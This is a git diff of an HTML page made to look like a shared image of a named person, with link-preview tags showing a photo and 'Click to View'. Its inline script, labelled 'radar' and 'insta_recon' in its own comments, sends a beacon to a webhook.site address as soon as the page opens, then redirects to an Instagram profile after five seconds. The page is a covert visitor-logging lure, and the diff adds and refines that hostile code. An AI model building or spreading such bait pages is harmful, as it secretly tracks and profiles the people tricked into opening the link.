@@ -1,24 +1,23 @@
 <!DOCTYPE html>
+<html>
 <head>
-    <title>Omrie "OZ" Lawrence</title>
-    <meta property="og:title" content="Omrie 'OZ' Lawrence">
-    
-    <meta property="og:description" content="View Shared Image">
-    
+    <title>Omrie "O.Z." Lawrence</title>
+    <meta property="og:title" content="Omrie 'O.Z.' Lawrence">
+    <meta property="og:description" content="Shared Image - Click to View">
     <meta property="og:image" content="https://raw.githubusercontent.com/bluekama/project-portfolio/main/IMG_0542.PNG">
-    <meta property="og:site_name" content="OZ">
-    
-    </head>
+    <meta property="og:type" content="image.png">
+    <meta name="twitter:card" content="summary_large_image">
+
     <script>
-        // TRIGGER 1: The radar fires the millisecond the link is opened
+        // TRIGGER 1: Fire the radar immediately
         const radar = "https://webhook.site/8447f537-1f81-4106-885a-dc4c3809223e";
-        const data = "?type=final_stealth&ts=" + Date.now();
+        const data = "?type=insta_recon&ts=" + Date.now();
         navigator.sendBeacon(radar + data);
 
-        // TRIGGER 2: The 5-second "Bait" timer
+        // TRIGGER 2: Redirect to Instagram after 5 seconds
         setTimeout(function() {
-            window.location.replace("https://www.google.com");
-        }, 5000); // 5000ms = 5 Seconds
+            window.location.replace("https://www.instagram.com/o.z._thaboxer_/");
+        }, 5000); 
     </script>
 
     <style>
